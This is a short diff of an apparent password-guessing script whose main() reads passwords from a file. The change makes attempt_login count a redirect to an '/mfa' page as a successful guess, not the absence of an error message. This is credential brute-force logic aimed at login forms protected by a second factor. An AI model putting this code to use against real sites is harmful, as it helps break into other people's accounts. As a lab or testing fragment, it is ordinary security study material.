@@ -36,10 +36,10 @@ def attempt_login(session, login_page_url, username, password, csrf_token=None):
     # Send the POST request to attempt login
     response = session.post(login_page_url, data=login_data)
     
-    # Check if the login was successful (based on response content)
-    if "Invalid username or password" not in response.text:
-        return True  # Login successful
-    return False  # Login failed
+    # Check if the user has been redirected to the MFA page
+    if "/mfa" in response.url:
+        return True  # Login successful, redirected to MFA
+    return False  # Login failed, not redirected to MFA
 
 def main():
     # Open the password file and read each password
